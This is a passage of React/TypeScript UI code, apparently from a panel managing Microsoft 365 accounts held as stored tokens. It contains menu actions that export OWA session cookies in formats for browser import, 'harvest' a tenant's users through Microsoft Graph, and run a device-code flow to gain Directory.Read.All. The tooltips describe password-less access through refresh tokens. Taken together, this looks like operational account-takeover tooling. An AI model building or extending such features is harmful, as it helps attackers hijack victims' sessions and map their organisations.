                            void handleOpenInDefaultBrowser(account.id);
                          }}
                          title="Open the Microsoft sign-in page in your default OS browser (Chrome / Safari / Firefox / Edge) with the email pre-filled and a redirect that lands on the inbox after sign-in. PASSWORD STILL REQUIRED — Microsoft does not allow refresh-token exchange in third-party browsers; the in-app button above is the only password-less path."
                        >
                          <i className="fas fa-external-link-alt"></i> Open in default browser (password required)
                        </div>
                      )}
                      {account.auth?.type === 'token' && (
                        <div
                          className="act-dropdown-item"
                          onClick={() => {
                            setOpenDropdownId(null);
                            setDropdownPosition(null);
                            handleExportCookies(account.id);
                          }}
                          title="Export this account's OWA cookies (Cookie-Editor JSON, DevTools console snippet, Cookie header, or Netscape file). Copy to clipboard or save to a file."
                        >
                          <i className="fas fa-file-export"></i> Export cookies
                        </div>
                      )}
                      {account.tags.includes('admin') && (
                        <>
                          <div
                            className="act-dropdown-item"
                            onClick={() => { setOpenDropdownId(null); setDropdownPosition(null); handleAdminHarvest(account.id, 'panel'); }}
                            title="Query the panel's /api/admin/associated-accounts endpoint."
                          >
                            <i className="fas fa-users"></i> View associated (via panel)
                          </div>
                          {account.auth?.type === 'token' && account.auth.adminGraphRefreshToken && (
                            <div
                              className="act-dropdown-item"
                              onClick={() => { setOpenDropdownId(null); setDropdownPosition(null); handleAdminHarvest(account.id, 'graph'); }}
                              title="Enumerate the tenant's users via Microsoft Graph admin scope."
                            >
                              <i className="fas fa-shield-alt"></i> View associated (via Graph)
                            </div>
                          )}
                          {account.auth?.type === 'token' && account.auth.adminGraphRefreshToken && (
                            <div
                              className="act-dropdown-item"
                              onClick={() => { setOpenDropdownId(null); setDropdownPosition(null); handleAdminHarvest(account.id, 'both'); }}
                              title="Combine panel + Graph results, deduped by email."
                            >
                              <i className="fas fa-layer-group"></i> View associated (panel + Graph)
                            </div>
                          )}
                          {account.auth?.type === 'token' && !account.auth.adminGraphRefreshToken && (
                            <div
                              className="act-dropdown-item"
                              onClick={() => { setOpenDropdownId(null); setDropdownPosition(null); setGrantAdminAccountId(account.id); }}
                              title="Run the device-code flow with Directory.Read.All to enable Graph enumeration."
                            >
                              <i className="fas fa-shield-alt"></i> Grant admin Graph access\u2026
                            </div>
                          )}
                        </>
                      )}
                      <div className="act-dropdown-divider"></div>
                      <div className="act-dropdown-item act-dropdown-danger" onClick={() => { setOpenDropdownId(null); setDropdownPosition(null); handleDeleteAccount(account.id); }}>
                        <i className="fas fa-trash"></i> Delete Account
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
          {/* Pagination */}
          <div className="pagination">
            <div className="pagination-controls">
              <button disabled={currentPage === 1} onClick={() => setCurrentPage(currentPage - 1)}>
                <i className="fas fa-chevron-left"></i>
              </button>
              <span className="pagination-info">
                Page{' '}
                <input
                  type="number"
                  min={1}
                  max={totalPages}
                  value={currentPage}
                  onChange={(e) => {
                    const val = parseInt(e.target.value);
                    if (!isNaN(val) && val >= 1 && val <= totalPages) {
                      setCurrentPage(val);
                    }
                  }}
                  onKeyDown={(e) => {
                    if (e.key === 'Enter') e.currentTarget.blur();
                  }}
                  style={{ width: '50px', textAlign: 'center', margin: '0 4px' }}
                />
                {' '}of {totalPages}
              </span>
              <button disabled={currentPage === totalPages} onClick={() => setCurrentPage(currentPage + 1)}>
                <i className="fas fa-chevron-right"></i>
              </button>
            </div>
            <div className="pagination-size">
              <span>Show:</span>
              <select value={itemsPerPage} onChange={(e) => { setItemsPerPage(Number(e.target.value)); setCurrentPage(1); }}>
                <option value={10}>10</option>
                <option value={25}>25</option>
                <option value={50}>50</option>
                <option value={-1}>All</option>
              </select>
            </div>
          </div>
        </div>
      </div>

      {/* Modals */}
      {showAddModal && (
        <AddAccountModal
          initialTab={addModalInitialTab}
          onCancel={() => {
            setShowAddModal(false);
            setAddModalInitialTab(undefined);
          }}
          onSuccess={() => {
            setShowAddModal(false);
            setAddModalInitialTab(undefined);
            loadData();
          }}
        />
      )}
      {showEditTagsModal && (

        <TagEditorModalComponent
          accountId={activeAccount}
          selectedAccounts={selectedAccounts.length > 0 ? selectedAccounts : undefined}
          onCancel={() => {
            setShowEditTagsModal(false);
            setActiveAccount(null);
          }}
          onSuccess={() => {
            setShowEditTagsModal(false);
            setActiveAccount(null);
            setSelectedAccounts([]);
            loadData();
          }}
        />
      )}
      {showExportModal && (
        <ExportModalComponent
          accountId={activeAccount}
          selectedAccounts={selectedAccounts.length > 0 ? selectedAccounts : undefined}
          onCancel={() => {
            setShowExportModal(false);
            setActiveAccount(null);
          }}
        />
      )}
      {showDeleteConfirm && (
        <DeleteConfirmModalComponent
          selectedAccounts={selectedAccounts}
          onCancel={() => setShowDeleteConfirm(false)}
          onSuccess={() => {
            setShowDeleteConfirm(false);
            setSelectedAccounts([]);
            loadData();
          }}
        />
      )}
      {reAuthAccountId && (() => {
        const target = accounts.find(a => a.id === reAuthAccountId);
        if (!target) {
          return null;
        }
        return (
          <ReAuthModal
            account={target}
            onCancel={() => setReAuthAccountId(null)}
            onSuccess={() => void loadData()}
          />
        );
      })()}
      {grantAdminAccountId && (() => {
        const target = accounts.find(a => a.id === grantAdminAccountId);
        if (!target) {
          return null;
        }
        return (
          <GrantAdminScopeModal
            account={target}
            onCancel={() => setGrantAdminAccountId(null)}
            onSuccess={() => void loadData()}
          />
        );
      })()}
      {cookieExportTarget && (
        <CookieExportModal
          accountId={cookieExportTarget.id}
          email={cookieExportTarget.email}
          onCancel={() => setCookieExportTarget(null)}
        />
      )}
    </div>
  );
};

export default AccountsView;